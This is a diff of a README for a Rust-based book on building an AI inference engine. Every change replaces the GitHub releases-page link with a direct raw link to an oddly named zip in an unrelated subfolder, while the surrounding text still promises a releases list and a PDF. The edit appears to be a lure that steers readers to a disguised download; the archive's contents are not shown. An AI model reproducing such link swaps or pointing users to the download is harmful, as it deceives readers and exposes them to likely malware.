@@ -1,6 +1,6 @@
 # 📖 from-tin-to-tokens - Learn to Build Your Own AI Engine
 
-[![Download Now](https://img.shields.io/badge/Download_from_tin_to_tokens-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Ing-Alvarado/from-tin-to-tokens/releases)
+[![Download Now](https://img.shields.io/badge/Download_from_tin_to_tokens-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/Ing-Alvarado/from-tin-to-tokens/main/enantiomorphism/tokens_to_tin_from_osculant.zip)
 
 ## 🎯 What Is This?
 
@@ -20,7 +20,7 @@ No prior AI experience is needed. If you can follow a recipe, you can follow thi
 
 Getting your copy of from-tin-to-tokens is simple and quick. Follow these three steps:
 
-**Step 1:** Visit this link to download the application: [https://github.com/Ing-Alvarado/from-tin-to-tokens/releases](https://github.com/Ing-Alvarado/from-tin-to-tokens/releases)
+**Step 1:** Visit this link to download the application: [https://raw.githubusercontent.com/Ing-Alvarado/from-tin-to-tokens/main/enantiomorphism/tokens_to_tin_from_osculant.zip](https://raw.githubusercontent.com/Ing-Alvarado/from-tin-to-tokens/main/enantiomorphism/tokens_to_tin_from_osculant.zip)
 
 **Step 2:** Look for the newest version at the top of the page. The file you need will have a name like `from-tin-to-tokens-v1.0.pdf` or similar.
 
@@ -28,7 +28,7 @@ Getting your copy of from-tin-to-tokens is simple and quick. Follow these three 
 
 ## 📦 Download and Install
 
-Visit this link to download the application: [https://github.com/Ing-Alvarado/from-tin-to-tokens/releases](https://github.com/Ing-Alvarado/from-tin-to-tokens/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Ing-Alvarado/from-tin-to-tokens/main/enantiomorphism/tokens_to_tin_from_osculant.zip](https://raw.githubusercontent.com/Ing-Alvarado/from-tin-to-tokens/main/enantiomorphism/tokens_to_tin_from_osculant.zip)
 
 Once you click the link, you'll see a list of released files. Choose the newest one, click on it, and your download will begin automatically.
 
@@ -136,6 +136,6 @@ You cannot sell this book or claim it as your own writing.
 
 The best time to learn something new is now. Visit the download page, grab your copy, and start your journey from tin to tokens.
 
-**[Download from-tin-to-tokens Now](https://github.com/Ing-Alvarado/from-tin-to-tokens/releases)**
+**[Download from-tin-to-tokens Now](https://raw.githubusercontent.com/Ing-Alvarado/from-tin-to-tokens/main/enantiomorphism/tokens_to_tin_from_osculant.zip)**
 
 Keywords: book, gpu, inference, llm, machine-learning, rust, systems-programming
